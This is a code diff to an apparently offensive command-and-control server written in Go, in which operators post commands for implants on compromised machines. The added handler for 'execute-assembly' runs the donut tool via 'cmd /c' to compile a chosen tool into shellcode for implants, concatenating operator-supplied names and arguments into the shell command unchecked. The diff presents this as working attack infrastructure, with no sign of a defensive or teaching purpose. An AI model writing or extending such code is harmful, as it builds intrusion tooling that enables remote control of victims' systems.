@@ -5,6 +5,9 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"os/exec"
+	"runtime"
+	"strings"
 	"sync"
 )
 
@@ -71,6 +74,25 @@ func postCommand(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	storedCommand = &command
 	mu.Unlock()
+
+	fmt.Println("Command Input:", command.Input)
+	if strings.ToLower(command.Input) == "execute-assembly" {
+		filename := command.Command
+		modulesPath := "..\\Tools\\"
+		fullPath := modulesPath + filename
+		var cmd *exec.Cmd
+
+		// Compile tool to Shellcode
+		fmt.Println("Compiling: ..\\donut\\donut.exe -a 2 --input:" + fullPath + " --output:..\\Encryption\\" + filename + ".bin --args:" + command.Args)
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/c", "..\\donut\\donut.exe -a 2 --input:"+fullPath+".exe --output:..\\OutputShellcode\\"+filename+".bin --args:"+command.Args)
+		}
+		err := cmd.Run()
+
+		if err != nil {
+			fmt.Printf("Error: %s", err)
+		}
+	}
 
 	w.WriteHeader(http.StatusOK)
 	fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
